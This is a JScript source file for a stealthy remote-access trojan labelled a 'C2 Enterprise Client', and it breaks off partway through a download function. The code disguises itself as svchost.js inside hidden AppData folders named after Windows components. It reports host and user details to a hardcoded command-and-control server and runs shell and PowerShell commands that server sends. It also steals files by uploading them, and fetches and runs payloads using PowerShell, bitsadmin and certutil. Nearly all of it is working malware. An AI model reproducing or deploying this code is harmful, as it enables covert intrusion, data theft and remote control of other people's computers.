// ============================================
// C2 ENTERPRISE CLIENT - UNIVERSAL WORKING VERSION
// Combines working polling logic with ALL stealth improvements
// Complete - No lines skipped - FIXED trim() error
// ============================================

var WshShell = WScript.CreateObject("WScript.Shell");
var fso = WScript.CreateObject("Scripting.FileSystemObject");
var network = WScript.CreateObject("WScript.Network");

// ========== CROSS-BROWSER TRIM FUNCTION ==========
function trim(str) {
    if (str == null || str == undefined) return "";
    return str.replace(/^\s+|\s+$/g, '');
}

// ========== ROBUST JSON PARSER ==========
var JSON = {
    parse: function(jsonString) {
        try {
            jsonString = jsonString.replace(/^\s+|\s+$/g, '');
            if (!jsonString || jsonString == '{}' || jsonString == '') return {};
            
            var content = jsonString.substring(1, jsonString.length - 1);
            if (!content) return {};
            
            var result = {};
            var inString = false;
            var current = '';
            var parts = [];
            
            for (var i = 0; i < content.length; i++) {
                var c = content.charAt(i);
                if (c == '"' && (i == 0 || content.charAt(i-1) != '\\')) {
                    inString = !inString;
                    current += c;
                } else if (c == ',' && !inString) {
                    if (current.length > 0) parts.push(current);
                    current = '';
                } else {
                    current += c;
                }
            }
            if (current.length > 0) parts.push(current);
            
            for (var p = 0; p < parts.length; p++) {
                var pair = parts[p].replace(/^\s+|\s+$/g, '');
                var colonIndex = -1;
                inString = false;
                
                for (var j = 0; j < pair.length; j++) {
                    var ch = pair.charAt(j);
                    if (ch == '"' && (j == 0 || pair.charAt(j-1) != '\\')) {
                        inString = !inString;
                    } else if (ch == ':' && !inString) {
                        colonIndex = j;
                        break;
                    }
                }
                
                if (colonIndex > -1) {
                    var key = pair.substring(0, colonIndex).replace(/^\s+|\s+$/g, '');
                    var value = pair.substring(colonIndex + 1).replace(/^\s+|\s+$/g, '');
                    
                    if (key.charAt(0) == '"' && key.charAt(key.length-1) == '"') {
                        key = key.substring(1, key.length-1);
                    }
                    
                    if (value.charAt(0) == '"' && value.charAt(value.length-1) == '"') {
                        value = value.substring(1, value.length-1);
                    } else if (value == 'true' || value == 'false') {
                        value = (value == 'true');
                    } else if (value == 'null') {
                        value = null;
                    } else if (!isNaN(value) && value.length > 0) {
                        value = parseFloat(value);
                    }
                    
                    result[key] = value;
                }
            }
            
            return result;
        } catch (e) {
            return {};
        }
    }
};

// ========== CONFIGURATION ==========
var CONFIG = {
    SERVER: "http://withoutwithin.onthewifi.com:8080",
    CLIENT_ID: null,
    POLL_INTERVAL: 30,
    HEARTBEAT_INTERVAL: 3600,
    DEBUG: true
};

var sessionToken = null;
var sessionExpiry = 0;
var currentDirectory = fso.GetAbsolutePathName(".");
var lastHeartbeat = 0;
var connectionStartTime = new Date().getTime();
var pollCount = 0;
var registrationFailCount = 0;

// ========== LOGGING ==========
function log(message) {
    var date = new Date();
    var timestamp = zeroPad(date.getHours(), 2) + ":" + 
                    zeroPad(date.getMinutes(), 2) + ":" + 
                    zeroPad(date.getSeconds(), 2);
    WScript.Echo("[" + timestamp + "] " + message);
}

function zeroPad(num, places) {
    var str = num.toString();
    while (str.length < places) {
        str = "0" + str;
    }
    return str;
}


// ========== STEALTH INSTALLATION ==========
var INSTALL_DIR = null;
var INSTALLED_SCRIPT = null;
var IS_INSTALLED = false;

// Set hidden+system attributes using FSO - NO cmd.exe, NO process, NO flash, ever
function setHidden(path) {
    try {
        if (fso.FileExists(path)) {
            var f = fso.GetFile(path);
            f.Attributes = f.Attributes | 2 | 4; // 2=Hidden, 4=System
        } else if (fso.FolderExists(path)) {
            var d = fso.GetFolder(path);
            d.Attributes = d.Attributes | 2 | 4;
        }
    } catch (e) {}
}

function initializeStealth() {
    try {
        // Use AppData\Roaming for stealth location (like Java client)
        var appData = WshShell.ExpandEnvironmentStrings("%APPDATA%");
        
        // Create hidden directory with legitimate-sounding name
        var legitNames = [
            "WindowsMediaPlayer",
            "MicrosoftEdge",
            "WindowsDefender",
            "SystemUpdates",
            "NetworkServices",
            "AudioServices"
        ];
        
        // Pick a random legitimate name
        var randomIndex = Math.floor(Math.random() * legitNames.length);
        var dirName = legitNames[randomIndex];
        
        INSTALL_DIR = fso.BuildPath(appData, dirName);
        
        // Create installation directory
        if (!fso.FolderExists(INSTALL_DIR)) {
            fso.CreateFolder(INSTALL_DIR);
            
            // Hide the folder (Windows) - FIXED: Window style 0 prevents CMD flash
            try {
                setHidden(INSTALL_DIR);
            } catch (e) {
                // Silently fail if can't hide
            }
        }
        
        // Create subdirectories for data
        createHiddenDir(fso.BuildPath(INSTALL_DIR, "data"));
        createHiddenDir(fso.BuildPath(INSTALL_DIR, "cache"));
        createHiddenDir(fso.BuildPath(INSTALL_DIR, "temp"));
        
        // Check if we're already running from install directory
        var currentScript = WScript.ScriptFullName;
        INSTALLED_SCRIPT = fso.BuildPath(INSTALL_DIR, "svchost.js");
        
        if (currentScript.toLowerCase() != INSTALLED_SCRIPT.toLowerCase()) {
            // We're NOT running from install dir - copy ourselves
            copyScriptToInstallDir(currentScript);
            launchInstalledVersion();
            
            // Exit this instance
            WScript.Sleep(2000);
            WScript.Quit(0);
        } else {
            // We ARE running from install dir
            IS_INSTALLED = true;
        }
        
        return true;
        
    } catch (e) {
        // Continue anyway - use current directory as fallback
        INSTALL_DIR = fso.GetAbsolutePathName(".");
        return false;
    }
}

function createHiddenDir(path) {
    try {
        if (!fso.FolderExists(path)) {
            fso.CreateFolder(path);
            
            // Hide the folder - FIXED: Window style 0 prevents CMD flash
            try {
                setHidden(path);
            } catch (e) {
                // Silently fail
            }
        }
    } catch (e) {
        // Silently fail
    }
}

function copyScriptToInstallDir(sourcePath) {
    try {
        // Copy the script
        fso.CopyFile(sourcePath, INSTALLED_SCRIPT, true);
        
        // Hide the installed script - FIXED: Window style 0 prevents CMD flash
        try {
            setHidden(INSTALLED_SCRIPT);
        } catch (e) {
            // Silently fail
        }
        
        return true;
        
    } catch (e) {
        return false;
    }
}

function launchInstalledVersion() {
    try {
        // Launch the installed version silently with //B flag (batch mode - no UI)
        WshShell.Run('wscript.exe //B //Nologo "' + INSTALLED_SCRIPT + '"', 0, false);
        return true;
    } catch (e) {
        return false;
    }
}

function getStealthPath(filename) {
    // Return path in the stealth data directory
    if (INSTALL_DIR) {
        var dataDir = fso.BuildPath(INSTALL_DIR, "data");
        return fso.BuildPath(dataDir, filename);
    }
    
    // Fallback to temp directory with hidden folder
    var tempDir = fso.GetSpecialFolder(2);
    var hiddenDir = fso.BuildPath(tempDir, ".winsvc");
    
    if (!fso.FolderExists(hiddenDir)) {
        fso.CreateFolder(hiddenDir);
        try {
            setHidden(hiddenDir);
        } catch (e) {}
    }
    
    return fso.BuildPath(hiddenDir, filename);
}

function getDownloadDir() {
    if (INSTALL_DIR) {
        return fso.BuildPath(INSTALL_DIR, "cache");
    }
    return fso.BuildPath(currentDirectory, "downloads");
}

function getUploadDir() {
    if (INSTALL_DIR) {
        return fso.BuildPath(INSTALL_DIR, "temp");
    }
    return fso.BuildPath(currentDirectory, "uploads");
}

// ========== SYSTEM INFO ==========
function generateClientId() {
    try {
        // Use stealth path for agent ID file
        var idFile = getStealthPath("agent_id.dat");
        
        if (fso.FileExists(idFile)) {
            var file = fso.OpenTextFile(idFile, 1);
            var savedId = file.ReadAll();
            file.Close();
            if (savedId && savedId.length > 0) {
                return savedId.replace(/[^\x20-\x7E]/g, '');
            }
        }
        
        var computerName = (network.ComputerName || "unknown").toLowerCase();
        computerName = computerName.replace(/[^a-z0-9]/g, "");
        if (computerName.length > 8) computerName = computerName.substring(0, 8);
        
        var userName = (network.UserName || "user").toLowerCase();
        userName = userName.replace(/[^a-z0-9]/g, "");
        if (userName.length > 4) userName = userName.substring(0, 4);
        
        var mac = getMacAddress().replace(/[^a-fA-F0-9]/g, "").toLowerCase();
        if (mac.length > 6) mac = mac.substring(0, 6);
        
        var persistentId = "tagent-" + computerName + "-" + userName + "-" + mac;
        
        // Save to stealth location
        var file = fso.OpenTextFile(idFile, 2, true);
        file.Write(persistentId);
        file.Close();
        
        // Hide the file - FIXED: Window style 0 prevents CMD flash
        try {
            setHidden(idFile);
        } catch (e) {}
        
        return persistentId;
    } catch (e) {
        return "tagent-" + Math.floor(Math.random() * 1000000);
    }
}

function getMacAddress() {
    try {
        // Use WMI instead of Exec to avoid CMD flash
        var colItems = GetObject("winmgmts:\\\\.\\root\\cimv2")
            .ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True");
        var e = new Enumerator(colItems);
        for (; !e.atEnd(); e.moveNext()) {
            var obj = e.item();
            if (obj.MACAddress) {
                return obj.MACAddress;
            }
        }
    } catch (e) {}
    return "00:00:00:00:00:00";
}

function getWindowsVersion() {
    try {
        var colItems = GetObject("winmgmts:\\\\.\\root\\cimv2")
            .ExecQuery("SELECT * FROM Win32_OperatingSystem");
        var e = new Enumerator(colItems);
        for (; !e.atEnd(); e.moveNext()) {
            var obj = e.item();
            return obj.Caption + " " + obj.Version;
        }
    } catch (e) {}
    return WshShell.ExpandEnvironmentStrings("%OS%") || "Unknown";
}

function getLocalIP() {
    try {
        var colItems = GetObject("winmgmts:\\\\.\\root\\cimv2")
            .ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True");
        var e = new Enumerator(colItems);
        for (; !e.atEnd(); e.moveNext()) {
            var obj = e.item();
            if (obj.IPAddress) {
                return obj.IPAddress(0);
            }
        }
    } catch (e) {}
    return "0.0.0.0";
}

// ========== HTTP COMMUNICATION ==========
function httpRequest(url, method, data) {
    try {
        var winHttp = WScript.CreateObject("WinHttp.WinHttpRequest.5.1");
        winHttp.Open(method, url, false);
        
        winHttp.SetRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
        winHttp.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        winHttp.SetRequestHeader("Accept", "application/json");
        
        if (sessionToken) {
            winHttp.SetRequestHeader("X-Session", sessionToken);
        }
        
        winHttp.SetTimeouts(30000, 30000, 60000, 60000);
        
        if (data) {
            winHttp.Send(data);
        } else {
            winHttp.Send();
        }
        
        if (winHttp.Status == 200) {
            return {
                success: true,
                status: winHttp.Status,
                responseText: winHttp.ResponseText
            };
        } else {
            // If unauthorized, clear session token to force re-registration
            if (winHttp.Status == 401 || winHttp.Status == 403) {
                sessionToken = null;
            }
            return {
                success: false,
                status: winHttp.Status,
                responseText: winHttp.ResponseText
            };
        }
    } catch (e) {
        // On network error, clear session to force reconnect
        sessionToken = null;
        return {
            success: false,
            error: e.message
        };
    }
}

// ========== REGISTRATION ==========
function performRegistration() {
    try {
        var mac = getMacAddress().replace(/:/g, "").toLowerCase();
        
        var params = "id=" + encodeURIComponent(CONFIG.CLIENT_ID) +
                     "&os=" + encodeURIComponent("Windows " + getWindowsVersion()) +
                     "&hostname=" + encodeURIComponent(network.ComputerName || "unknown") +
                     "&ip=" + encodeURIComponent(getLocalIP()) +
                     "&user=" + encodeURIComponent(network.UserName || "unknown") +
                     "&process=" + encodeURIComponent("wscript.exe") +
                     "&mac=" + mac +
                     "&session=" + (sessionToken ? sessionToken : "");
        
        var response = httpRequest(CONFIG.SERVER + "/register", "POST", params);
        
        if (response.success) {
            registrationFailCount = 0; // Reset fail count on success
            
            if (response.responseText && response.responseText != "{}") {
                try {
                    var result = JSON.parse(response.responseText);
                    
                    // Regex fallbacks
                    if (!result.session) {
                        var sessionMatch = /"session"\s*:\s*"([^"]+)"/.exec(response.responseText);
                        if (sessionMatch && sessionMatch[1]) {
                            result.session = sessionMatch[1];
                        }
                    }
                    
                    if (!result.command) {
                        var commandMatch = /"command"\s*:\s*"([^"]+)"/.exec(response.responseText);
                        if (commandMatch && commandMatch[1]) {
                            result.command = commandMatch[1];
                        }
                    }
                    
                    if (!result.type) {
                        var typeMatch = /"type"\s*:\s*"([^"]+)"/.exec(response.responseText);
                        if (typeMatch && typeMatch[1]) {
                            result.type = typeMatch[1];
                        }
                    }
                    
                    if (!result.id) {
                        var idMatch = /"id"\s*:\s*"([^"]+)"/.exec(response.responseText);
                        if (idMatch && idMatch[1]) {
                            result.id = idMatch[1];
                        }
                    }
                    
                    if (result.session) {
                        sessionToken = result.session;
                        sessionExpiry = new Date().getTime() + (30 * 24 * 60 * 60 * 1000);
                    }
                    
                    if (result.command) {
                        executeAndSendResult(result.id, result.command, result.type || "SHELL");
                    }
                } catch (e) {
                    // Silent fail
                }
            }
            
            return true;
        } else {
            registrationFailCount++;
            return false;
        }
    } catch (e) {
        registrationFailCount++;
        return false;
    }
}

// ========== POLLING ==========
// CRITICAL: Use /register endpoint for polling (compatible with all servers)
function pollForCommands() {
    if (!sessionToken && registrationFailCount < 5) {
        // Try to register first
        performRegistration();
        return;
    }
    
    try {
        var osInfo = "Windows " + getWindowsVersion();
        var hostname = network.ComputerName || "unknown";
        var ip = getLocalIP();
        var user = network.UserName || "unknown";
        var process = "wscript.exe";
        
        var params = "id=" + encodeURIComponent(CONFIG.CLIENT_ID) +
                     "&os=" + encodeURIComponent(osInfo) +
                     "&hostname=" + encodeURIComponent(hostname) +
                     "&ip=" + encodeURIComponent(ip) +
                     "&user=" + encodeURIComponent(user) +
                     "&process=" + encodeURIComponent(process) +
                     "&session=" + encodeURIComponent(sessionToken ? sessionToken : "");
        
        var response = httpRequest(CONFIG.SERVER + "/register", "POST", params);
        
        if (response.success) {
            var responseText = response.responseText || "";
            
            // Check if response contains a command
            if (responseText && responseText != "{}" && responseText.indexOf('"command":') > -1) {
                
                try {
                    var cmdData = JSON.parse(responseText);
                    
                    // Regex fallbacks
                    if (!cmdData.command) {
                        var commandMatch = /"command"\s*:\s*"([^"]+)"/.exec(responseText);
                        if (commandMatch) cmdData.command = commandMatch[1];
                    }
                    if (!cmdData.type) {
                        var typeMatch = /"type"\s*:\s*"([^"]+)"/.exec(responseText);
                        if (typeMatch) cmdData.type = typeMatch[1];
                    }
                    if (!cmdData.id) {
                        var idMatch = /"id"\s*:\s*"([^"]+)"/.exec(responseText);
                        if (idMatch) cmdData.id = idMatch[1];
                    }
                    
                    var command = cmdData.command;
                    var type = cmdData.type;
                    var cmdId = cmdData.id;
                    
                    if (command && cmdId) {
                        executeAndSendResult(cmdId, command, type || "SHELL");
                    }
                } catch (e) {
                    // Silent fail
                }
            }
        } else {
            // If polling fails, try to re-register
            if (response.status == 401 || response.status == 403) {
                sessionToken = null;
            }
        }
        
    } catch (e) {
        // Silent fail
    }
}

// ========== HEARTBEAT ==========
function sendHeartbeat() {
    if (!sessionToken) {
        return false;
    }
    
    try {
        var uptime = new Date().getTime() - connectionStartTime;
        
        var params = "id=" + encodeURIComponent(CONFIG.CLIENT_ID) +
                     "&session=" + encodeURIComponent(sessionToken) +
                     "&uptime=" + uptime;
        
        var response = httpRequest(CONFIG.SERVER + "/heartbeat", "POST", params);
        
        if (response.success) {
            lastHeartbeat = new Date().getTime();
            return true;
        } else {
            return false;
        }
    } catch (e) {
        return false;
    }
}

function shouldSendHeartbeat() {
    var now = new Date().getTime();
    var elapsed = (now - lastHeartbeat) / 1000;
    return elapsed >= CONFIG.HEARTBEAT_INTERVAL;
}

// ========== COMMAND EXECUTION ==========
function executeCommand(command, type) {
    var actualCommand = command;
    
    if (command.indexOf(':') > -1) {
        var parts = command.split(':');
        if (parts[0].toUpperCase() == type.toUpperCase()) {
            actualCommand = command.substring(command.indexOf(':') + 1);
        }
    }
    
    var typeUpper = type.toUpperCase();
    
    switch (typeUpper) {
        case "SHELL":
            return executeShellCommand(actualCommand);
        case "DOWNLOAD":
            return handleDownload(actualCommand);
        case "UPLOAD":
            return handleUpload(actualCommand);
        case "EXECUTE":
            return handleExecute(actualCommand);
        case "PERSISTENCE":
            return handlePersistenceCommand(actualCommand);
        case "SYSINFO":
            return getSystemInfo();
        case "PROCESS_LIST":
            return getProcessList();
        case "LISTFILES":
            return listFiles(actualCommand);
        case "LISTROOTDRIVES":
            return listRootDrives();
        case "READFILE":
            return readFile(actualCommand);
        case "DELETEFILE":
            return deleteFile(actualCommand);
        case "NEWFOLDER":
            return createFolder(actualCommand);
        case "KILL_PROCESS":
            return killProcess(actualCommand);
        case "EXECUTEFILE":
            return executeFile(actualCommand);
        case "FILEPROPERTIES":
            return getFileProperties(actualCommand);
        case "OPENFILE":
            return openFile(actualCommand);
        case "COPYFILE":
            return copyFile(actualCommand);
        case "MOVEFILE":
            return moveFile(actualCommand);
        case "RENAMEFILE":
            return renameFile(actualCommand);
        case "KILL":
            return killAgent();
        default:
            return "Unknown command type: " + type;
    }
}

// ========== DOWNLOAD COMMAND ==========
function handleDownload(command) {
    try {
        var parts = command.split(":");
        if (parts.length < 1) return "Invalid download format";
        
        var remotePath = parts[0];
        var execute = parts.length > 1 && parts[1] == "EXECUTE";
        var deleteAfter = parts.length > 2 && parts[2] == "DELETE";
        
        var filename = remotePath;
        if (remotePath.indexOf("\\") > -1) {
            filename = remotePath.substring(remotePath.lastIndexOf("\\") + 1);
        } else if (remotePath.indexOf("/") > -1) {
            filename = remotePath.substring(remotePath.lastIndexOf("/") + 1);
        }
        
        // Download from server
        var url = CONFIG.SERVER + "/download?file=" + encodeURIComponent(filename);
        
        var winHttp = WScript.CreateObject("WinHttp.WinHttpRequest.5.1");
        winHttp.Open("GET", url, false);
        winHttp.SetTimeouts(30000, 30000, 120000, 120000);
        winHttp.Send();
        
        if (winHttp.Status == 200) {
            // Use stealth download directory
            var downloadDir = getDownloadDir();
            if (!fso.FolderExists(downloadDir)) {
                fso.CreateFolder(downloadDir);
            }
            
            var localFile = fso.BuildPath(downloadDir, filename);
            
            // Handle file name collision
            var counter = 1;
            while (fso.FileExists(localFile)) {
                var nameWithoutExt = filename;
                var ext = "";
                if (filename.indexOf(".") > -1) {
                    nameWithoutExt = filename.substring(0, filename.lastIndexOf("."));
                    ext = filename.substring(filename.lastIndexOf("."));
                }
                localFile = fso.BuildPath(downloadDir, nameWithoutExt + "_" + counter + ext);
                counter++;
            }
            
            // Save binary data
            var stream = WScript.CreateObject("ADODB.Stream");
            stream.Type = 1; // Binary
            stream.Open();
            stream.Write(winHttp.ResponseBody);
            stream.SaveToFile(localFile, 2);
            stream.Close();
            
            // Hide downloaded file
            try {
                setHidden(localFile);
            } catch (e) {}
            
            var fileSize = fso.GetFile(localFile).Size;
            var result = "File downloaded: " + localFile + " (" + formatSize(fileSize) + ")";
            
            // Execute if requested
            if (execute) {
                try {
                    var exec = WshShell.Exec('"' + localFile + '"');
                    WScript.Sleep(2000);
                    
                    if (exec.Status == 0) {
                        result += " (executed in background)";
                    } else {
                        result += " (executed, exit code: " + exec.ExitCode + ")";
                    }
                    
                    // Delete if requested
                    if (deleteAfter && exec.Status != 0) {
                        if (fso.FileExists(localFile)) {
                            fso.DeleteFile(localFile);
                            result += " (file deleted)";
                        }
                    }
                } catch (e) {
                    result += " (execution failed: " + e.message + ")";
                }
            }
            
            return result;
            
        } else {
            return "Download failed: HTTP " + winHttp.Status;
        }
        
    } catch (e) {
        return "Download error: " + e.message;
    }
}

// ========== UPLOAD COMMAND ==========
function handleUpload(command) {
    try {
        var parts = command.split(":");
        if (parts.length < 1) return "Invalid upload format";
        
        var filePath = parts[0];
        var execute = parts.length > 1 && parts[1] == "EXECUTE";
        
        if (!fso.FileExists(filePath)) {
            return "File not found: " + filePath;
        }
        
        var file = fso.GetFile(filePath);
        var filename = file.Name;
        
        // Read file as binary
        var stream = WScript.CreateObject("ADODB.Stream");
        stream.Type = 1; // Binary
        stream.Open();
        stream.LoadFromFile(filePath);
        var fileData = stream.Read();
        stream.Close();
        
        // Upload to server
        var winHttp = WScript.CreateObject("WinHttp.WinHttpRequest.5.1");
        winHttp.Open("POST", CONFIG.SERVER + "/upload", false);
        winHttp.SetRequestHeader("X-Filename", filename);
        winHttp.SetRequestHeader("X-AgentId", CONFIG.CLIENT_ID);
        if (execute) {
            winHttp.SetRequestHeader("X-Execute", "true");
        }
        winHttp.SetRequestHeader("Content-Type", "application/octet-stream");
        winHttp.SetTimeouts(30000, 30000, 300000, 300000); // 5 min for large files
        
        winHttp.Send(fileData);
        
        if (winHttp.Status == 200) {
            var result = "File uploaded successfully: " + filePath + 
                        " (" + formatSize(file.Size) + ")";
            if (execute) {
                result += " (marked for execution)";
            }
            return result;
        } else {
            return "Upload failed: HTTP " + winHttp.Status;
        }
        
    } catch (e) {
        return "Upload error: " + e.message;
    }
}

// ========== EXECUTE COMMAND ==========
function handleExecute(command) {
    try {
        var filePath = command;
        
        if (!fso.FileExists(filePath)) {
            return "File not found: " + filePath;
        }
        
        var exec = WshShell.Exec('"' + filePath + '"');
        WScript.Sleep(2000);
        
        if (exec.Status == 0) {
            return "File executed in background: " + filePath;
        } else {
            var output = "";
            if (!exec.StdOut.AtEndOfStream) {
                output = exec.StdOut.ReadAll();
            }
            var error = "";
            if (!exec.StdErr.AtEndOfStream) {
                error = exec.StdErr.ReadAll();
            }
            
            var result = "Executed: " + filePath + "\n" +
                        "Exit Code: " + exec.ExitCode + "\n";
            if (output) result += "Output:\n" + output;
            if (error) result += "\nError:\n" + error;
            
            return result;
        }
        
    } catch (e) {
        return "Execute error: " + e.message;
    }
}

// ========== SHELL COMMAND ==========
// ========== COMPLETELY FIXED SHELL COMMAND ==========
function executeShellCommand(command) {
    try {
        // Handle cd command separately
        if (command.toLowerCase().substring(0, 3) == "cd ") {
            var path = trim(command.substring(3));
            var newDir;
            
            if (path == "..") {
                var parent = fso.GetParentFolderName(currentDirectory);
                if (parent) {
                    newDir = parent;
                } else {
                    return "Cannot go up from root\n[Exit Code: 1]";
                }
            } else {
                newDir = fso.BuildPath(currentDirectory, path);
            }
            
            if (fso.FolderExists(newDir)) {
                currentDirectory = newDir;
                return "Changed directory to: " + currentDirectory + "\n[Exit Code: 0]";
            } else {
                return "Directory not found: " + path + "\n[Exit Code: 1]";
            }
        }
        
        // CRITICAL FIX: Clean the command of any problematic characters
        var cleanCommand = command;
        
        // Remove any backslash-escaping of quotes that might have been added
        cleanCommand = cleanCommand.replace(/\\"/g, '"');
        
        // Remove any double backslashes
        cleanCommand = cleanCommand.replace(/\\\\/g, '\\');
        
        // For PowerShell commands, we need special handling
        if (cleanCommand.toLowerCase().indexOf("powershell") > -1) {
            return executePowerShellCommand(cleanCommand);
        }
        
        // For certutil commands, remove quotes around URLs if present
        if (cleanCommand.toLowerCase().indexOf("certutil") > -1) {
            cleanCommand = cleanCertutilCommand(cleanCommand);
        }
        
        // Build the command with current directory context
        var cmd = "%comspec% /c chdir /D \"" + currentDirectory + "\" && " + cleanCommand + " 2>&1 && echo [CWD:%cd%]";
        
        // Log the actual command being executed (for debugging)
        var debugMsg = "Executing: " + cmd + "\n";
        
        var process = WshShell.Exec(cmd);
        
        var timeout = 60000;
        var startTime = new Date().getTime();
        var output = "";
        
        while (process.Status == 0) {
            if (new Date().getTime() - startTime > timeout) {
                process.Terminate();
                output = "[ERROR] Command timed out\n";
                break;
            }
            WScript.Sleep(100);
        }
        
        if (!process.StdOut.AtEndOfStream) {
            output = process.StdOut.ReadAll();
            
            var cwdMatch = /\[CWD:(.*?)\]/.exec(output);
            if (cwdMatch && cwdMatch[1]) {
                currentDirectory = cwdMatch[1];
                output = output.replace(/\[CWD:.*?\]\r?\n?/, '');
            }
        }
        
        if (!process.StdErr.AtEndOfStream) {
            var error = process.StdErr.ReadAll();
            if (error) {
                output += "\n[STDERR]\n" + error;
            }
        }
        
        var result = "Command: " + command + "\n";
        result += "Directory: " + currentDirectory + "\n";
        result += "========================================\n";
        result += debugMsg + output;
        result += "\n[Exit Code: " + (process.ExitCode || 0) + "]";
        
        return result;
        
    } catch (e) {
        return "Command failed: " + e.message + "\n[Exit Code: 1]";
    }
}

// ========== SPECIAL HANDLER FOR POWERSHELL COMMANDS ==========
function executePowerShellCommand(command) {
    try {
        // Clean the PowerShell command
        var cleanCommand = command;
        
        // Fix common PowerShell quote issues
        // If the command has escaped quotes, fix them
        cleanCommand = cleanCommand.replace(/\\"/g, '"');
        
        // For download commands with $env:AppData, we need to handle differently
        if (cleanCommand.indexOf('$env:') > -1) {
            // Extract the URL and destination
            var urlMatch = cleanCommand.match(/['"](https?:\/\/[^'"]+)['"]/);
            var destMatch = cleanCommand.match(/\$env:([^'"]+)/);
            
            if (urlMatch && destMatch) {
                var url = urlMatch[1];
                var envVar = destMatch[1];
                
                // Get the actual path from environment variable
                var shell = WScript.CreateObject("WScript.Shell");
                var envPath = shell.ExpandEnvironmentStrings("%" + envVar + "%");
                
                // Create a simpler command that will work
                var simpleCommand = "powershell -Command \"$client = New-Object System.Net.WebClient; $client.DownloadFile('" + url + "', '" + envPath + "\\win.js')\"";
                cleanCommand = simpleCommand;
            }
        }
        
        // For regular PowerShell commands, ensure quotes are balanced
        var quoteCount = (cleanCommand.match(/"/g) || []).length;
        if (quoteCount % 2 != 0) {
            // Odd number of quotes - add one at the end
            cleanCommand += '"';
        }
        
        // Execute the PowerShell command
        var cmd = "%comspec% /c chdir /D \"" + currentDirectory + "\" && " + cleanCommand + " 2>&1 && echo [CWD:%cd%]";
        
        var process = WshShell.Exec(cmd);
        
        var timeout = 60000;
        var startTime = new Date().getTime();
        var output = "";
        
        while (process.Status == 0) {
            if (new Date().getTime() - startTime > timeout) {
                process.Terminate();
                output = "[ERROR] Command timed out\n";
                break;
            }
            WScript.Sleep(100);
        }
        
        if (!process.StdOut.AtEndOfStream) {
            output = process.StdOut.ReadAll();
            
            var cwdMatch = /\[CWD:(.*?)\]/.exec(output);
            if (cwdMatch && cwdMatch[1]) {
                currentDirectory = cwdMatch[1];
                output = output.replace(/\[CWD:.*?\]\r?\n?/, '');
            }
        }
        
        if (!process.StdErr.AtEndOfStream) {
            var error = process.StdErr.ReadAll();
            if (error) {
                output += "\n[STDERR]\n" + error;
            }
        }
        
        var result = "PowerShell Command: " + command + "\n";
        result += "Directory: " + currentDirectory + "\n";
        result += "========================================\n";
        result += output;
        result += "\n[Exit Code: " + (process.ExitCode || 0) + "]";
        
        return result;
        
    } catch (e) {
        return "PowerShell failed: " + e.message + "\n[Exit Code: 1]";
    }
}

// ========== SPECIAL HANDLER FOR CERTUTIL COMMANDS ==========
function cleanCertutilCommand(command) {
    // Remove quotes around URLs for certutil
    return command.replace(/"?(https?:\/\/[^"\s]+)"?/g, '$1');
}

// ========== NEW: DIRECT DOWNLOAD FUNCTION ==========
function downloadFile(url, destination) {
    try {
        var shell = WScript.CreateObject("WScript.Shell");
        var fso = WScript.CreateObject("Scripting.FileSystemObject");
        
        // Expand environment variables in destination
        var expandedDest = shell.ExpandEnvironmentStrings(destination);
        
        // Create directory if it doesn't exist
        var destFolder = fso.GetParentFolderName(expandedDest);
        if (!fso.FolderExists(destFolder)) {
            fso.CreateFolder(destFolder);
        }
        
        // Use multiple methods to download
        var methods = [
            function() { // Method 1: PowerShell WebClient
                var psCmd = "powershell -Command \"$client = New-Object System.Net.WebClient; $client.DownloadFile('" + url + "', '" + expandedDest + "')\"";
                return shell.Run(psCmd, 0, true);
            },
            function() { // Method 2: BITSAdmin
                var bitsCmd = "bitsadmin /transfer job /download /priority high \"" + url + "\" \"" + expandedDest + "\"";
                return shell.Run(bitsCmd, 0, true);
            },
            function() { // Method 3: CertUtil
                var certCmd = "certutil -urlcache -split -f \"" + url + "\" \"" + expandedDest + "\"";
                return shell.Run(certCmd, 0, true);
            }
        ];
        
        // Try each method until one works
        for (var i = 0; i < methods.length; i++) {
            try {
                var exitCode = methods[i]();
                if (exitCode === 0 || exitCode === 1) { // Some tools return 1 on success
                    if (fso.FileExists(expandedDest)) {
                        var fileSize = fso.GetFile(expandedDest).Size;
                        return "✓ Downloaded successfully using method " + (i+1) + "\n" +
                               "  File: " + expandedDest + "\n" +
                               "  Size: " + formatSize(fileSize);
                    }
                }
            } catch (e) {
                // Try next method
            }
        }
        
        return "✗ All download methods failed";
        
    } catch (e) {
        return "Download error: " + e.message;
    }
}

// ========== UNIVERSAL DOWNLOAD HANDLER ==========
function universalDownload(url, destination) {
    try {
        // Expand Windows environment variables (%AppData%, %Temp%, etc.)
        var expandedDest = WshShell.ExpandEnvironmentStrings(destination);
        
        // Create directory if it doesn't exist
        var destFolder = expandedDest.substring(0, expandedDest.lastIndexOf('\\'));
        if (!fso.FolderExists(destFolder)) {
            fso.CreateFolder(destFolder);
        }
        
        // Try multiple methods in order of reliability
        var methods = [
            // Method 1: PowerShell WebClient (Most reliable)
            function() {
                var psCmd = "powershell -Command \"$wc = New-Object System.Net.WebClient; $wc.DownloadFile('" + url + "', '" + expandedDest + "')\"";
                return WshShell.Run(psCmd, 0, true);
            },
            // Method 2: BITSAdmin
            function() {
                var bitsCmd = "bitsadmin /transfer job /download /priority high \"" + url + "\" \"" + expandedDest + "\"";
                return WshShell.Run(bitsCmd, 0, true);
            },
            // Method 3: CertUtil
            function() {
                var certCmd = "certutil -urlcache -split -f \"" + url + "\" \"" + expandedDest + "\"";
                return WshShell.Run(certCmd, 0, true);
            },
            // Method 4: PowerShell Invoke-WebRequest
            function() {
                var psCmd = "powershell -Command \"Invoke-WebRequest -Uri '" + url + "' -OutFile '" + expandedDest + "'\"";
                return WshShell.Run(psCmd, 0, true);
            }
        ];
        
        var result = "Downloading: " + url + "\n";
        result += "To: " + expandedDest + "\n";
        result += "========================================\n";
        
        for (var i = 0; i < methods.length; i++) {
            try {
                result += "Trying method " + (i+1) + "... ";
                var exitCode = methods[i]();
                
                // Check if file was created
                if (fso.FileExists(expandedDest)) {
                    var file = fso.GetFile(expandedDest);
                    if (file.Size > 0) {
                        result += "✓ SUCCESS! (" + formatSize(file.Size) + ")\n";
                        return result;
                    }
                }
                result += "✗ Failed (exit code: " + exitCode + ")\n";
            } catch (e) {
                result += "✗ Error: " + e.message + "\n";
            }
        }
        
        result += "All download methods failed!\n";
